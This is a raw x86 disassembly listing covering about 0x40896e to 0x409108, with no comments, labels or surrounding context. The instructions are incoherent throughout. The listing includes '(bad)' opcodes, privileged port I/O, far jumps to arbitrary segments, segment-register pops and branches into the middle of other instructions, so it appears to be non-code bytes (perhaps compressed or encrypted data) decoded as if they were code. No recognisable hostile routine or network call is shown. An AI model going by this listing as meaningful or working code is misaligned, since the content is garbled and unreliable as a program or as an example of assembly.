  40896e:	mov    al,BYTE PTR [eax+0x35]
  408971:	xor    al,BYTE PTR [ebx+0x562cf496]
  408977:	or     edx,esi
  408979:	cmp    al,0xbd
  40897b:	mov    esp,0xe996c244
  408980:	rol    BYTE PTR [esi-0x2],0x1d
  408984:	fwait
  408985:	or     DWORD PTR [esi+0x7e16951e],edx
  40898b:	pop    ecx
  40898c:	js     0x408955
  40898e:	les    edi,FWORD PTR [eax-0x1da78ba5]
  408994:	scas   al,BYTE PTR es:[edi]
  408995:	scas   eax,DWORD PTR es:[edi]
  408996:	jge    0x408982
  408998:	pop    ebp
  408999:	and    BYTE PTR [ecx-0x563193f6],dh
  40899f:	push   eax
  4089a0:	fidivr WORD PTR [eax]
  4089a2:	push   edx
  4089a3:	mov    bl,0x1f
  4089a5:	inc    edi
  4089a6:	pop    ds
  4089a7:	cli    
  4089a8:	scas   al,BYTE PTR es:[edi]
  4089a9:	bound  edi,QWORD PTR [esi+edi*2]
  4089ac:	leave  
  4089ad:	sub    eax,0xcabff529
  4089b2:	and    eax,DWORD PTR [eax]
  4089b4:	xor    DWORD PTR [edx+0x5d],ecx
  4089b7:	enter  0x8b29,0x5b
  4089bb:	ss in  eax,dx
  4089bd:	dec    eax
  4089be:	mov    ds:0x6046902a,al
  4089c3:	outs   dx,DWORD PTR ds:[esi]
  4089c4:	add    DWORD PTR fs:[ecx-0x57],0xfcccb25c
  4089cc:	mov    ds:0x950abf1b,eax
  4089d1:	(bad)  
  4089d2:	fistp  WORD PTR [ebx+0x3f034ea]
  4089d8:	xchg   DWORD PTR [eax-0x5a],ebx
  4089db:	cmp    al,0x0
  4089dd:	jnp    0x4089ed
  4089df:	out    0x1d,eax
  4089e1:	outs   dx,DWORD PTR ds:[esi]
  4089e2:	test   al,0x84
  4089e4:	xchg   esp,eax
  4089e5:	dec    si
  4089e7:	ror    BYTE PTR [edi],1
  4089e9:	js     0x408a3a
  4089eb:	imul   ebp,DWORD PTR [esi+0x13],0x2bc19be1
  4089f2:	test   DWORD PTR [esi+edx*4-0x54a08bc5],edi
  4089f9:	dec    eax
  4089fa:	sub    al,BYTE PTR [ebx-0xbf90907]
  408a00:	clc    
  408a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a02:	scas   al,BYTE PTR es:[edi]
  408a03:	jns    0x4089b6
  408a05:	xchg   DWORD PTR [ebx+0x3fdc734b],esp
  408a0b:	sbb    ecx,ecx
  408a0d:	lods   eax,DWORD PTR ds:[esi]
  408a0e:	fidiv  WORD PTR [ecx-0x7f6e0f75]
  408a14:	mov    ebx,es
  408a16:	dec    edi
  408a17:	gs xchg ecx,eax
  408a19:	rcl    bl,0x29
  408a1c:	scas   eax,DWORD PTR es:[edi]
  408a1d:	(bad)  
  408a1e:	fst    DWORD PTR [eax]
  408a20:	out    dx,eax
  408a21:	shl    BYTE PTR [edx+edi*8+0x23],1
  408a25:	stos   DWORD PTR es:[edi],eax
  408a26:	push   ss
  408a27:	sub    eax,0x3d1a8ff4
  408a2c:	scas   al,BYTE PTR es:[edi]
  408a2d:	xchg   esp,eax
  408a2e:	rol    DWORD PTR [edi+0x54bc1fb2],0x58
  408a35:	loop   0x4089cc
  408a37:	jmp    0xa78a97b3
  408a3c:	pop    edx
  408a3d:	sub    al,0xa9
  408a3f:	pop    ds
  408a40:	push   es
  408a41:	ins    DWORD PTR es:[edi],dx
  408a42:	jnp    0x4089d0
  408a44:	lods   eax,DWORD PTR ds:[esi]
  408a45:	xchg   ecx,eax
  408a46:	add    edi,esi
  408a48:	scas   eax,DWORD PTR es:[edi]
  408a49:	test   al,0xf0
  408a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a4c:	mov    eax,ds:0x7fe449fa
  408a51:	and    al,ah
  408a53:	xchg   dh,bl
  408a55:	fdiv   st(1),st
  408a57:	add    eax,0xf5a75de0
  408a5c:	dec    esp
  408a5d:	add    DWORD PTR [esi-0x295d3ad4],eax
  408a63:	lahf   
  408a64:	mov    ds:0xd4e0cafe,al
  408a69:	das    
  408a6a:	inc    esi
  408a6b:	ret    
  408a6c:	mov    ecx,0x5c23a29e
  408a71:	add    al,0xf7
  408a73:	add    DWORD PTR [edx+0x78],ebp
  408a76:	shr    DWORD PTR [ebp+0x7756ed99],0x69
  408a7d:	inc    ebx
  408a7e:	mov    WORD PTR gs:[esi],es
  408a81:	fwait
  408a82:	int3   
  408a83:	add    ebp,esi
  408a85:	ja     0x408a3f
  408a87:	repnz sbb eax,0x65d93a10
  408a8d:	adc    DWORD PTR [ebx],ebx
  408a8f:	xchg   edi,eax
  408a90:	dec    esp
  408a91:	dec    esi
  408a92:	push   esp
  408a93:	sbb    ah,al
  408a95:	jge    0x408a7c
  408a97:	div    dh
  408a99:	xor    ebx,DWORD PTR [ecx+0x2b838b80]
  408a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aa0:	jb     0x408b1a
  408aa2:	fild   QWORD PTR [esi-0x6c399ef5]
  408aa8:	jmp    0xddd4:0x2782d212
  408aaf:	adc    ch,BYTE PTR [eax+0x60]
  408ab2:	in     al,0x7
  408ab4:	iret   
  408ab5:	jmp    0x1af6b7c7
  408aba:	and    cl,BYTE PTR [edx+esi*1+0x6196b61]
  408ac1:	out    dx,al
  408ac2:	jne    0x408a55
  408ac4:	sub    BYTE PTR [eax+0x227347fa],0x2e
  408acb:	xor    al,0xe2
  408acd:	push   ebx
  408ace:	pop    ebp
  408acf:	or     al,0xdc
  408ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ad2:	(bad)  
  408ad3:	mov    esp,0xa6434fbc
  408ad8:	jmp    0xf629:0x23d835e5
  408adf:	mov    esp,0x6f9a07b3
  408ae4:	mov    edx,0x502df8c9
  408ae9:	int3   
  408aea:	sub    eax,0x66d83cbc
  408aef:	leave  
  408af0:	cli    
  408af1:	push   ebx
  408af2:	aas    
  408af3:	call   0xea2:0xca805de5
  408afa:	scas   al,BYTE PTR es:[edi]
  408afb:	or     BYTE PTR [edx],dl
  408afd:	jae    0x408b4c
  408aff:	addr16 mov esi,0x5b88670d
  408b05:	lods   al,BYTE PTR ds:[esi]
  408b06:	add    BYTE PTR [ecx-0x50],dh
  408b09:	cwde   
  408b0a:	jmp    0x408acb
  408b0c:	lds    esi,FWORD PTR [eax]
  408b0e:	stc    
  408b0f:	cmp    ebp,ebp
  408b11:	xlat   BYTE PTR ds:[ebx]
  408b12:	xchg   ah,bl
  408b14:	gs in  eax,dx
  408b16:	dec    eax
  408b17:	ins    BYTE PTR es:[edi],dx
  408b18:	add    bh,BYTE PTR [ebp+0x68f1910f]
  408b1e:	pop    ebx
  408b1f:	mov    esi,0x343ea8d7
  408b24:	int3   
  408b25:	push   edx
  408b26:	jecxz  0x408acf
  408b28:	cmp    dh,BYTE PTR [edx-0x29]
  408b2b:	mov    ebx,0xedc5c118
  408b30:	jge    0x408ad5
  408b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b33:	jne    0x408b32
  408b35:	nop
  408b36:	popa   
  408b37:	imul   eax,DWORD PTR [bx+di],0x68
  408b3b:	movsx  eax,bx
  408b3e:	dec    ebx
  408b3f:	ror    DWORD PTR [edx-0x4d],0xe8
  408b43:	and    DWORD PTR [eax-0x40800d4e],0x5ffde6fe
  408b4d:	xor    dh,BYTE PTR [edi-0x2694493e]
  408b53:	mov    bl,0xe9
  408b55:	mov    eax,ds:0xcdfac13c
  408b5a:	int    0x38
  408b5c:	pushf  
  408b5d:	bound  ecx,QWORD PTR [edi+0x3d]
  408b60:	dec    ebp
  408b61:	mov    eax,ds:0x377065e9
  408b66:	jecxz  0x408af2
  408b68:	lods   al,BYTE PTR ds:[esi]
  408b69:	cmp    edx,ebp
  408b6b:	stos   BYTE PTR es:[edi],al
  408b6c:	xor    al,0x5
  408b6e:	arpl   WORD PTR [ecx],sp
  408b70:	jno    0x408bcb
  408b72:	fmul   QWORD PTR [eax-0x3d]
  408b75:	dec    edx
  408b76:	or     DWORD PTR [esi+0x5d41684d],ebp
  408b7c:	sbb    DWORD PTR [esi],edi
  408b7e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408b80:	adc    eax,0xffffff98
  408b83:	stc    
  408b84:	icebp  
  408b85:	mov    ah,0xbd
  408b87:	add    eax,0x83f25fb9
  408b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b8d:	xchg   DWORD PTR [edi-0x3a],eax
  408b90:	pusha  
  408b91:	stos   DWORD PTR es:[edi],eax
  408b92:	lods   al,BYTE PTR ds:[esi]
  408b93:	and    ah,BYTE PTR [edi+0x71]
  408b96:	push   esi
  408b97:	mov    al,0x2c
  408b99:	retf   0x6a6d
  408b9c:	fnstcw WORD PTR [edx-0x69]
  408b9f:	pop    ds
  408ba0:	int3   
  408ba1:	xor    BYTE PTR [ebx],ah
  408ba3:	dec    eax
  408ba4:	lods   eax,DWORD PTR ds:[esi]
  408ba5:	fidivr WORD PTR [esp+edx*2-0x31]
  408ba9:	jmp    0x408bc4
  408bab:	or     eax,0xd6e95edd
  408bb0:	push   ecx
  408bb1:	lds    esi,FWORD PTR [ebp-0x4a]
  408bb4:	mov    eax,ds:0x5fc64f25
  408bb9:	cld    
  408bba:	aas    
  408bbb:	or     DWORD PTR [ebx],edi
  408bbd:	sbb    eax,0xd8f538e1
  408bc2:	scas   al,BYTE PTR es:[edi]
  408bc3:	and    eax,0xd00b2be1
  408bc8:	aas    
  408bc9:	inc    esi
  408bca:	ja     0x408b99
  408bcc:	icebp  
  408bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bce:	call   0x7588:0x99d16b88
  408bd5:	pop    ds
  408bd6:	mov    dh,0x80
  408bd8:	or     eax,0xada9f705
  408bdd:	dec    edi
  408bde:	scas   al,BYTE PTR es:[edi]
  408bdf:	mov    eax,ds:0xf7113924
  408be4:	mov    ebp,0xde4f3bdd
  408be9:	jnp    0x408b78
  408beb:	push   esp
  408bec:	imul   edx,DWORD PTR ds:0xd21ea02,0xaf0c0a38
  408bf6:	jae    0x408bea
  408bf8:	outs   dx,BYTE PTR ds:[esi]
  408bf9:	fwait
  408bfa:	and    BYTE PTR [ebp+0x1506ecd],dl
  408c00:	fs adc al,0x28
  408c03:	mov    eax,0x7df976ba
  408c08:	push   ecx
  408c09:	cwde   
  408c0a:	jae    0x408be1
  408c0c:	pop    DWORD PTR [ebx+0x58]
  408c0f:	jmp    0x2c0f:0x627b7940
  408c16:	test   al,0xd9
  408c18:	xor    eax,0x2e237b53
  408c1d:	or     eax,DWORD PTR [edi+0x1b76b0b0]
  408c23:	push   0x6373b62f
  408c28:	jns    0x408c98
  408c2a:	xor    eax,0xa2038e64
  408c2f:	sti    
  408c30:	ja     0x408be2
  408c32:	xor    BYTE PTR [edi],cl
  408c34:	mov    ah,0x62
  408c36:	lods   eax,DWORD PTR ds:[esi]
  408c37:	dec    esp
  408c38:	inc    esi
  408c39:	adc    cl,BYTE PTR ds:0xec6a6605
  408c3f:	mov    ebx,0xb10e7929
  408c44:	mov    ds:0xa58eca0e,al
  408c49:	sub    al,0x53
  408c4b:	inc    ebp
  408c4c:	jmp    0xf741:0x547b3a14
  408c53:	test   DWORD PTR [edi+edi*2-0x4],edi
  408c57:	iret   
  408c58:	jae    0x408c54
  408c5a:	mov    al,ds:0xdd660c33
  408c5f:	lock das 
  408c61:	sbb    eax,0xa2f8e0a0
  408c66:	inc    edi
  408c67:	adc    bl,al
  408c69:	xor    ebp,DWORD PTR [eax]
  408c6b:	or     BYTE PTR [ecx+esi*8+0x11d3bf19],bl
  408c72:	and    BYTE PTR [ebx+ebx*8-0x238c222c],dl
  408c79:	cld    
  408c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c7b:	mov    ebx,0xabf433a
  408c80:	test   BYTE PTR [edi+0x4a],bh
  408c83:	outs   dx,DWORD PTR ds:[esi]
  408c84:	inc    BYTE PTR ds:0x7b6eb025
  408c8a:	or     al,0x2b
  408c8c:	dec    eax
  408c8d:	xchg   ecx,eax
  408c8e:	adc    BYTE PTR [edx],dl
  408c90:	daa    
  408c91:	int3   
  408c92:	push   ds
  408c93:	or     ecx,DWORD PTR [ecx]
  408c95:	sti    
  408c96:	(bad)  
  408c97:	lock adc eax,0x3cc6fd05
  408c9d:	add    ch,BYTE PTR [eax-0xf575f0e]
  408ca3:	dec    edi
  408ca4:	popa   
  408ca5:	add    al,0xa6
  408ca7:	js     0x408c99
  408ca9:	sahf   
  408caa:	fmul   st(1),st
  408cac:	push   ebx
  408cad:	or     DWORD PTR [edi],ecx
  408caf:	cmp    DWORD PTR [eax-0x6340aeea],0x6e
  408cb6:	lds    ecx,FWORD PTR [esi]
  408cb8:	inc    edx
  408cb9:	lock ret 
  408cbb:	dec    esi
  408cbd:	push   es
  408cbe:	outs   dx,BYTE PTR ds:[esi]
  408cbf:	jno    0x408ca2
  408cc1:	push   ebp
  408cc2:	pop    ss
  408cc3:	xchg   BYTE PTR [ecx-0x11],dl
  408cc6:	out    0xd6,eax
  408cc8:	sub    ah,al
  408cca:	mov    WORD PTR [ebp+0x6e1568d1],?
  408cd0:	jl     0x408cb9
  408cd2:	mov    ds:0x47373431,eax
  408cd7:	mov    ecx,0xde10752d
  408cdc:	nop
  408cdd:	inc    esp
  408cde:	test   ch,0xbe
  408ce1:	pop    ecx
  408ce2:	lds    eax,FWORD PTR [eax+ebx*8-0x11]
  408ce6:	dec    esp
  408ce7:	fild   DWORD PTR [edi+0x64]
  408cea:	not    BYTE PTR [esp+ecx*4+0x6e859817]
  408cf1:	xchg   ebx,eax
  408cf2:	int3   
  408cf3:	xor    cl,BYTE PTR [ebx+0x10]
  408cf6:	pop    ecx
  408cf7:	xchg   esi,eax
  408cf8:	bound  edx,QWORD PTR [edi+0x66434332]
  408cfe:	mov    eax,0xbc67961c
  408d03:	or     edi,DWORD PTR ds:0x1aa39e0
  408d09:	lods   al,BYTE PTR ds:[esi]
  408d0a:	sub    eax,0x39ad6e02
  408d0f:	or     al,0xea
  408d11:	xor    ebx,DWORD PTR [eax]
  408d13:	int3   
  408d14:	or     ch,dh
  408d16:	xchg   DWORD PTR [edi-0x33],edi
  408d19:	xchg   ebx,eax
  408d1a:	pop    esp
  408d1b:	pop    ecx
  408d1c:	hlt    
  408d1d:	aam    0xec
  408d1f:	scas   al,BYTE PTR es:[edi]
  408d20:	push   ds
  408d21:	ins    DWORD PTR es:[edi],dx
  408d22:	mov    ebx,0x738aa4fe
  408d27:	arpl   WORD PTR [edi],sp
  408d29:	call   0x32d181f
  408d2e:	test   eax,0x7dbedab8
  408d33:	adc    ah,ch
  408d35:	or     al,0xe0
  408d37:	sbb    BYTE PTR [eax],bl
  408d39:	and    BYTE PTR [esi+ebx*8+0x6e0e48b3],cl
  408d40:	mov    eax,ds:0x36823d83
  408d45:	cmp    DWORD PTR [ecx+eax*4-0x54d7790f],ebx
  408d4c:	and    BYTE PTR [ebx-0x7c],dl
  408d4f:	ja     0x408cf5
  408d51:	push   ds
  408d52:	das    
  408d53:	rol    bx,1
  408d56:	jecxz  0x408d25
  408d58:	mov    esp,0xb436b29f
  408d5d:	mov    dl,0xa6
  408d5f:	sti    
  408d60:	xlat   BYTE PTR ds:[ebx]
  408d61:	out    0x90,eax
  408d63:	jl     0x408da3
  408d65:	jg     0x408d8b
  408d67:	pushf  
  408d68:	rcl    BYTE PTR [ebx],0x3
  408d6b:	dec    ecx
  408d6c:	xchg   esi,eax
  408d6d:	out    dx,al
  408d6e:	fadd   QWORD PTR [esp+eiz*8]
  408d71:	fidiv  WORD PTR [eax+0x17fdd144]
  408d77:	loop   0x408d8b
  408d79:	pop    esi
  408d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d7b:	pop    ds
  408d7c:	fmul   st(0),st
  408d7e:	test   eax,0x65792bff
  408d83:	ins    DWORD PTR es:[edi],dx
  408d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d85:	jle    0x408d68
  408d87:	jge    0x408d59
  408d89:	cwde   
  408d8a:	repz lahf 
  408d8c:	inc    eax
  408d8d:	arpl   WORD PTR [eax-0x43],sp
  408d90:	mov    WORD PTR [edi],es
  408d92:	inc    eax
  408d93:	add    eax,DWORD PTR [eax-0x2d]
  408d96:	out    dx,eax
  408d97:	mov    dh,0x2c
  408d99:	les    ebx,FWORD PTR [ebx+0x379cbb68]
  408d9f:	lea    ecx,[eax]
  408da1:	test   al,0xab
  408da3:	les    esp,FWORD PTR [esi]
  408da5:	push   ebp
  408da6:	fisub  WORD PTR [edi]
  408da8:	push   0xffffffe3
  408daa:	mov    al,ds:0x6398b978
  408daf:	fnstsw WORD PTR [ebx+0x461c59d8]
  408db5:	ins    DWORD PTR es:[edi],dx
  408db6:	and    eax,DWORD PTR [edi]
  408db8:	mov    WORD PTR [eax-0xc],ss
  408dbb:	jb     0x408dc0
  408dbd:	imul   edi,DWORD PTR [ecx-0x73],0x15
  408dc1:	dec    edi
  408dc2:	fsub   DWORD PTR [ebx+0x5a]
  408dc5:	mov    eax,0xc6458220
  408dca:	fcmovbe st,st(1)
  408dcc:	cmp    eax,0xc0a2474b
  408dd1:	div    DWORD PTR [ecx]
  408dd3:	xchg   BYTE PTR [esi-0x35],dl
  408dd6:	or     BYTE PTR [ebx+esi*1-0x70],bh
  408dda:	adc    al,0xfe
  408ddc:	div    DWORD PTR [edx+0x23878fd0]
  408de2:	mov    eax,ds:0x6fcccc50
  408de7:	loope  0x408da8
  408de9:	sbb    al,0x6f
  408deb:	inc    edx
  408dec:	xchg   edi,eax
  408ded:	int    0xc
  408def:	mov    ebx,0x384d9b89
  408df4:	sub    edx,esi
  408df6:	mov    ecx,0x76acec73
  408dfb:	aaa    
  408dfc:	das    
  408dfd:	stc    
  408dfe:	mov    al,0x11
  408e00:	mov    bh,0x89
  408e02:	inc    ecx
  408e03:	scas   eax,DWORD PTR es:[edi]
  408e04:	sbb    BYTE PTR [esi+edi*1-0x2f],al
  408e08:	sub    eax,DWORD PTR [ebx+ebx*2]
  408e0b:	pop    ebx
  408e0c:	pop    edx
  408e0d:	xor    ebx,edi
  408e0f:	and    al,0x1d
  408e11:	call   0xf2f55f20
  408e16:	daa    
  408e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e18:	jnp    0x408da6
  408e1a:	inc    ecx
  408e1b:	lahf   
  408e1c:	push   esp
  408e1d:	out    dx,al
  408e1e:	mov    ds:0x75c28141,al
  408e23:	not    ch
  408e25:	adc    eax,0xb8bc5177
  408e2a:	jle    0x408e13
  408e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2d:	jo     0x408e31
  408e2f:	push   0xffffffd6
  408e31:	sub    edi,DWORD PTR [eax]
  408e33:	or     BYTE PTR [ecx-0x7b],ah
  408e36:	das    
  408e37:	mov    ah,0xf8
  408e39:	test   BYTE PTR [edi-0x6c4dec2f],al
  408e3f:	int    0xde
  408e41:	inc    esp
  408e42:	cmp    BYTE PTR [edi+0x3a],dl
  408e45:	imul   ebp,DWORD PTR [edi-0x2],0xffffffaa
  408e49:	lds    edx,FWORD PTR [esi+0x3a]
  408e4c:	hlt    
  408e4d:	jnp    0x408e35
  408e4f:	pop    edx
  408e50:	pop    esp
  408e51:	inc    ebx
  408e52:	fisubr DWORD PTR [ecx-0x4b]
  408e55:	js     0x408e69
  408e57:	mov    al,ds:0xbf49883
  408e5c:	and    edi,0xffffffc0
  408e5f:	push   cs
  408e60:	push   ebp
  408e61:	gs add al,0xce
  408e64:	jecxz  0x408e4f
  408e66:	mov    ecx,0xb2e571a7
  408e6b:	xor    dh,dl
  408e6d:	xor    al,0xf2
  408e6f:	call   FWORD PTR [edi+0x6]
  408e72:	in     eax,0xea
  408e74:	pop    ss
  408e75:	ror    esp,1
  408e77:	mov    dh,0x2b
  408e79:	call   edx
  408e7b:	dec    edx
  408e7c:	jl     0x408e52
  408e7e:	sbb    BYTE PTR [edx],bh
  408e80:	in     al,dx
  408e81:	sub    eax,0xf00dd1e0
  408e86:	adc    eax,0xeee55fcf
  408e8b:	loop   0x408eaf
  408e8d:	pop    ebp
  408e8e:	mov    bh,0x3a
  408e90:	cmp    ah,BYTE PTR [ecx]
  408e92:	in     al,dx
  408e93:	xchg   cl,dl
  408e95:	xor    BYTE PTR [ebp+0x6d61acae],bh
  408e9b:	xchg   ecx,eax
  408e9c:	call   0x1a0aaabb
  408ea1:	push   ecx
  408ea2:	push   edx
  408ea3:	call   0xcd743dc4
  408ea8:	mov    edx,0xe4b20f00
  408ead:	push   0xd60a3cac
  408eb2:	mov    dh,0x37
  408eb4:	pop    esp
  408eb5:	cmp    ecx,edi
  408eb7:	jp     0x408ec3
  408eb9:	xchg   edx,eax
  408eba:	push   esi
  408ebb:	pop    esp
  408ebc:	mov    dh,cl
  408ebe:	jmp    FWORD PTR [edx]
  408ec0:	push   0xffffff95
  408ec2:	jae    0x408f35
  408ec4:	jp     0x408eb6
  408ec6:	scas   al,BYTE PTR es:[edi]
  408ec7:	daa    
  408ec8:	mov    ds:0xe239cc4d,eax
  408ecd:	ret    
  408ece:	jnp    0x408f34
  408ed0:	push   esi
  408ed1:	cld    
  408ed2:	push   edx
  408ed3:	mov    al,0xca
  408ed5:	inc    ebx
  408ed6:	and    BYTE PTR [edx+eiz*4],bl
  408ed9:	sub    BYTE PTR [esi-0x1eaf0144],cl
  408edf:	ds daa 
  408ee1:	add    DWORD PTR [ebp-0x3686576],0xbcfe40bc
  408eeb:	dec    ecx
  408eec:	mov    ah,0x5a
  408eee:	repnz es mov al,0xff
  408ef2:	ficomp WORD PTR [edi]
  408ef4:	stc    
  408ef5:	adc    esi,eax
  408ef7:	clc    
  408ef8:	or     BYTE PTR [esp+esi*8-0x80],0x2f
  408efd:	shr    DWORD PTR [edi-0x17682621],0x6
  408f04:	jo     0x408eb5
  408f06:	push   ebp
  408f07:	aam    0x7f
  408f09:	sahf   
  408f0a:	pop    ebx
  408f0b:	sub    DWORD PTR gs:[esi+0x40a6643],esi
  408f12:	xor    al,0x8e
  408f14:	dec    edi
  408f15:	mov    dl,0x11
  408f17:	lods   al,BYTE PTR ds:[esi]
  408f18:	inc    ebx
  408f19:	push   edx
  408f1a:	lea    esi,[edi]
  408f1c:	jecxz  0x408f43
  408f1e:	add    DWORD PTR [edx-0x4d],esi
  408f21:	and    eax,ecx
  408f23:	adc    bl,ch
  408f25:	or     dh,dl
  408f27:	or     al,0x9b
  408f29:	aaa    
  408f2a:	push   eax
  408f2b:	sbb    eax,0x8f65ff25
  408f30:	sahf   
  408f31:	push   ebx
  408f32:	or     dh,BYTE PTR [ecx+esi*4-0x59]
  408f36:	xchg   ebp,eax
  408f37:	rcr    BYTE PTR [edi+0x28],0xea
  408f3b:	cmp    eax,0x886726c5
  408f40:	jmp    DWORD PTR [esi-0x7b]
  408f43:	rcl    BYTE PTR [ecx+0x1e],0x70
  408f47:	pxor   mm5,QWORD PTR [esi-0x17]
  408f4b:	push   ebp
  408f4c:	pusha  
  408f4d:	sub    BYTE PTR [edi-0x3b],dl
  408f50:	and    al,0xb3
  408f52:	adc    bh,0x5b
  408f55:	and    esp,DWORD PTR [esi]
  408f57:	pop    ebx
  408f58:	inc    edx
  408f59:	adc    edx,eax
  408f5b:	add    DWORD PTR [eax-0x28],ebx
  408f5e:	mov    cl,0x50
  408f60:	xchg   BYTE PTR [eax+0x3eaccefb],dl
  408f66:	imul   ecx,DWORD PTR ds:0x874e0e69,0xa7f700d2
  408f70:	and    eax,ebx
  408f72:	push   0x33
  408f74:	mov    esi,DWORD PTR [esi+0x52]
  408f77:	outs   dx,DWORD PTR ds:[esi]
  408f78:	mov    al,ds:0x9546ab7d
  408f7d:	mov    al,ds:0x6c3db4eb
  408f82:	gs jno 0x408f93
  408f85:	and    bh,al
  408f87:	cmp    ch,BYTE PTR [eax-0x5127f1da]
  408f8d:	push   ebp
  408f8e:	mov    ah,0xb
  408f90:	sub    eax,0xf9627edb
  408f95:	inc    ebp
  408f96:	fisub  WORD PTR [edi-0x11942af2]
  408f9c:	scas   al,BYTE PTR es:[edi]
  408f9d:	add    eax,edx
  408f9f:	shl    DWORD PTR [esp+ecx*4],0x9d
  408fa3:	or     BYTE PTR [eax+0x67b4acd7],dl
  408fa9:	repnz push ds
  408fab:	and    eax,0xd537a007
  408fb0:	dec    edi
  408fb1:	push   0xffffffa7
  408fb3:	pop    edx
  408fb4:	sbb    esp,ebp
  408fb6:	dec    esp
  408fb7:	nop
  408fb8:	jge    0x409036
  408fba:	sub    edx,esp
  408fbc:	push   edi
  408fbd:	mov    dl,0xae
  408fbf:	jp     0x408fc1
  408fc1:	cs jnp 0x408fc6
  408fc4:	adc    BYTE PTR [edi+0xbf3699e],bh
  408fca:	push   esi
  408fcb:	std    
  408fcc:	jge    0x408fe8
  408fce:	mov    al,ds:0x9cb1425e
  408fd3:	bound  eax,QWORD PTR [esi-0x78]
  408fd6:	cwde   
  408fd7:	lahf   
  408fd8:	popa   
  408fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fda:	inc    eax
  408fdb:	sub    eax,0x174139ba
  408fe0:	mov    dh,0xe
  408fe2:	and    al,0x57
  408fe4:	daa    
  408fe5:	adc    eax,0x28a0ad15
  408fea:	xor    al,0xd
  408fec:	or     al,0x74
  408fee:	cmp    dl,dh
  408ff0:	jg     0x408fba
  408ff2:	fs xor al,0x5d
  408ff6:	sbb    BYTE PTR [edi],cl
  408ff8:	fldenv [ebp-0x27]
  408ffb:	push   ebx
  408ffc:	adc    eax,0xf4ee6afd
  409001:	imul   edi,DWORD PTR [edx+eiz*1-0x1e],0x72
  409006:	mov    ah,0xe7
  409008:	pop    esp
  409009:	push   eax
  40900a:	inc    edx
  40900b:	lahf   
  40900c:	xor    esp,DWORD PTR [edx]
  40900e:	and    bl,BYTE PTR [ecx-0x1c]
  409011:	mov    ss,WORD PTR [ecx+esi*4]
  409014:	sti    
  409015:	bnd jl 0x40905d
  409018:	fnstenv [esp+edi*1-0x16fa26ba]
  40901f:	xchg   edi,eax
  409020:	ds inc edi
  409022:	xchg   ecx,eax
  409023:	sub    al,0x5c
  409025:	aaa    
  409026:	cmp    DWORD PTR [edx],0xffffff97
  409029:	mov    dl,0xd3
  40902b:	int    0x31
  40902d:	pop    esp
  40902e:	cld    
  40902f:	mov    dl,0x70
  409031:	mul    DWORD PTR [ebx]
  409033:	rol    BYTE PTR ds:0xca361cfb,0x55
  40903a:	enter  0x78b,0x81
  40903e:	inc    eax
  40903f:	jne    0x408fe9
  409041:	fsubrp st(2),st
  409043:	and    ebp,ebx
  409045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409046:	jns    0x409035
  409048:	fwait
  409049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40904a:	and    eax,DWORD PTR [edx-0x77395554]
  409050:	push   ss
  409051:	scas   eax,DWORD PTR es:[edi]
  409052:	aas    
  409053:	jb     0x4090d3
  409055:	div    BYTE PTR [ebp+0x40073525]
  40905b:	mov    ah,0x9d
  40905d:	hlt    
  40905e:	es pop esi
  409060:	das    
  409061:	test   al,0xf0
  409064:	icebp  
  409065:	scas   al,BYTE PTR es:[edi]
  409066:	mov    dh,ch
  409068:	mov    bl,0x30
  40906a:	call   0x7af:0x4313014b
  409071:	jnp    0x40908b
  409073:	jb     0x409076
  409075:	rcl    BYTE PTR [eax-0x2a203277],cl
  40907b:	cdq    
  40907c:	jae    0x409044
  40907e:	mov    al,ds:0xd812d267
  409083:	jmp    DWORD PTR [eax]
  409085:	mov    esp,eax
  409087:	test   eax,0x8fb95929
  40908c:	in     eax,0x69
  40908e:	adc    al,BYTE PTR [edx+0x1f341d9c]
  409094:	xor    al,0x62
  409096:	cmp    eax,0xb820a43c
  40909b:	je     0x409109
  40909d:	pop    edx
  40909e:	fild   WORD PTR [ebx-0x68]
  4090a1:	je     0x40905c
  4090a3:	test   BYTE PTR [ebp+0xb],0x1a
  4090a7:	push   esp
  4090a8:	or     DWORD PTR [eax+0x21],ecx
  4090ab:	lea    eax,[ebx+0x4785192]
  4090b1:	adc    BYTE PTR [ebx+0x43],bh
  4090b4:	lea    edx,[eax]
  4090b6:	sahf   
  4090b7:	shl    bl,0xb1
  4090ba:	jnp    0x409128
  4090bc:	dec    eax
  4090bd:	pop    edx
  4090be:	sub    al,0x3b
  4090c0:	jge    0x4090f1
  4090c2:	add    al,0xd3
  4090c4:	mov    BYTE PTR [esi-0x64dea418],bh
  4090ca:	mov    bl,0x64
  4090cc:	push   ebx
  4090cd:	dec    eax
  4090ce:	scas   al,BYTE PTR es:[edi]
  4090cf:	sahf   
  4090d0:	xor    al,ah
  4090d2:	and    cl,0x4d
  4090d5:	imul   dl
  4090d7:	xchg   BYTE PTR [edi-0x5f7a487e],cl
  4090dd:	mov    ah,0x26
  4090df:	retf   0xf888
  4090e2:	pop    esp
  4090e3:	leave  
  4090e4:	ret    0x2660
  4090e7:	scas   eax,DWORD PTR es:[edi]
  4090e8:	dec    esp
  4090e9:	sbb    al,BYTE PTR [ebp-0x1cda1c53]
  4090ef:	and    al,0xa6
  4090f1:	push   ecx
  4090f2:	sbb    BYTE PTR [edi],al
  4090f4:	push   esi
  4090f5:	cmp    al,0x44
  4090f7:	mov    ah,0xb1
  4090f9:	sti    
  4090fa:	cmp    edx,edi
  4090fc:	(bad)  
  4090fd:	in     eax,0xdf
  4090ff:	xchg   ebp,eax
  409100:	rol    DWORD PTR [eax+0x376cf7d2],1
  409106:	loopne 0x409173
  409108:	mov    eax,DWORD PTR ds:[ebp-0x25]
